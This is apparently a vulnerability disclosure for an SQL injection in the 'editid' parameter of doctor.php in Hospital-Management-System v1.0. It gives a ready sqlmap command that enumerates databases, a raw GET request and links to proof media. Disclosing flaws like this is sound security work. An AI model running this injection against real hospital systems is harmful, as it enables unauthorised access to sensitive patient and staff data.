**[Hospital-Management-System v1.0 - SQLi](https://itsourcecode.com/free-projects/php-project/hospital-management-system-in-php-with-source-code/)**
---

[Vendor](https://itsourcecode.com/author/unguardable/)
---

![图片](https://user-images.githubusercontent.com/23294478/167287177-e0668d4e-0d93-42fe-ab75-99fadba4c7f9.png)


### Description:
---
The vulnerability page is ```doctor.php```

```http://your-ip/HMS/doctor.php```


Hospital-Management-System v1.0  

The ```editid``` parameter in the ```doctor.php``` page appears to be vulnerable to SQL injection attacks.

[+]sqlmap:


python sqlmap.py -u "http://your-ip/hms/doctor.php?editid=1" --random-agent  --dbs



[+]GET request package

```
GET /hms/doctor.php?editid=1 HTTP/1.1
Host: 192.168.74.136
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=cpbuir6uql3t0128e61bn2ihm1
Upgrade-Insecure-Requests: 1

```
### In action:
---

![图片](https://user-images.githubusercontent.com/23294478/167287194-2e52da93-30a6-4f7c-b8f5-a2b1048921e6.png)


### Proof and Exploit:
---

https://user-images.githubusercontent.com/23294478/167287234-9d07a890-c975-4077-b316-72d2dc40acd1.mp4

